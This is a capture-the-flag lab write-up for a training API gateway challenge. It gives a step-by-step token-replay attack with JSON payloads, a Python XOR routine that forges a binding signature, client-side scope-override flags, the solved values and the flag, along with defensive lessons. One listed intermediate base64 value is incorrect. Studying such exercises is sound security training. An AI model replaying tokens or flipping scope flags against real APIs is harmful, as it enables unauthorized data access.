# CTF — Track 03 · HAG-05 · HELIOS API Gateway · Preview Token Replay

> Side activity — NOT a learning record. Status: ✅ SOLVED 2026-06-21.

**Flag:** `KA{hag_preview_token_replay_trainingflag}`

## Mission
Preview tokens are not bound to artifacts server-side. A token minted for a public artifact can be replayed against a restricted artifact using client-supplied scope and cross-artifact overrides.

## Attack chain
1. `list-artifacts` → find double-base64 restricted artifact name
2. Decode name (base64 × 2) → `protected-manifest`
3. `request-preview-token` (for public artifact) → token
4. Compute `bindingSig = xorHex("protected-manifest", last4(token))`
5. `bind-preview-token` → bound
6. `fetch-preview-artifact` with `scopeOverride=true`, `crossArtifact=true`, correct `bindingSig` → flag

## Solved data
| item | value |
|---|---|
| restricted artifact (encoded) | `Y0hKdmRHVmpkR1ZrTFcxaGJtbG1aWE4w` |
| after 1st b64 decode | `Y2hKdmRHVmpkR1ZrTW1lbmlmZXN0` (intermediate) |
| decoded artifact name | `protected-manifest` |
| token | `preview-df9d1dcb` |
| last 4 chars of token | `1dcb` |
| bindingSig | `41160c165407170755490e035f0d05074210` |
| flag | `KA{hag_preview_token_replay_trainingflag}` |

## bindingSig computation
```python
def xor_hex(a, b):
    return ''.join(f'{ord(c) ^ ord(b[i % len(b)]):02x}' for i, c in enumerate(a))

xor_hex('protected-manifest', '1dcb')
# → 41160c165407170755490e035f0d05074210
```

## Solution walkthrough

### Step 1 — list artifacts + decode restricted name
```javascript
payload: { actionId: 'list-artifacts' }
```
Three artifacts: `briefing-summary` (public), `YnJpZWZpbmctYXJjaGl2ZQ==` (public, b64), `Y0hKdmRHVmpkR1ZrTFcxaGJtbG1aWE4w` (restricted, b64x2).

Double-decode restricted → `protected-manifest`.

### Step 2 — mint token for public artifact
```javascript
payload: { actionId: 'request-preview-token', artifact: 'briefing-summary' }
```
→ `token: "preview-df9d1dcb"`.

### Step 3 — bind with cross-artifact target
```javascript
payload: { actionId: 'bind-preview-token', token: 'preview-df9d1dcb',
           artifact: 'protected-manifest', bindingSig: '41160c165407170755490e035f0d05074210' }
```
→ bound, `bindingNonce: "7C"`.

### Step 4 — replay against restricted artifact
```javascript
payload: { actionId: 'fetch-preview-artifact', token: 'preview-df9d1dcb',
           artifact: 'protected-manifest', scopeOverride: true,
           crossArtifact: true, bindingSig: '41160c165407170755490e035f0d05074210' }
```
→ manifest leaked → flag.

## Key learnings

### Attack class: token replay / confused deputy (OWASP API5)
The token was minted for `briefing-summary` but replayed against `protected-manifest`. The backend never bound the token to its original artifact server-side — the only binding was a client-supplied `bindingSig` derived from a known formula. Tokens must be cryptographically bound to their intended target at issuance, not at replay.

### Client-controlled scope elevation
`scopeOverride=true` and `crossArtifact=true` are boolean flags the client supplies to bypass scope restrictions. These are the same root cause as every prior HAG challenge: security enforcement toggled off by client-supplied fields.

### Weak binding signature = XOR with disclosed key
`bindingSig = xorHex(artifact, last4(token))` — the last 4 chars of the token were visible in the response, the artifact name was derived from a disclosed encoding, and XOR is reversible. No secret component.

### Obscurity as access control (double base64)
The restricted artifact name was double-encoded. This provided no actual access control — just an encoding step anyone can reverse. Lesson: encoding is not access control; authorization checks must be server-side.

### Manual XOR error
Note: initial manual XOR transposed bytes at positions 15-16 (`e` and `s` in "manifest"). Always verify manual byte arithmetic with code. Cost: one extra round-trip.

## HAG track final summary

| # | Challenge | Core vuln | Client bypass field(s) |
|---|---|---|---|
| HAG-01 | Debug echo | Debug path not removed | `mode=debug`, `echoTarget` |
| HAG-02 | Safety mode tamper | Client-controlled safetyMode | `safetyMode`, `ackLegacy` |
| HAG-03 | Transcript export leak | Undocumented analyst path | `format=analyst`, `redactionWaiver` |
| HAG-04 | Stream chunk leak | Pre-redaction buffer readable | `redact=false`, `bypassCleanup=true` |
| HAG-05 | Preview token replay | Token not bound to artifact server-side | `scopeOverride=true`, `crossArtifact=true` |
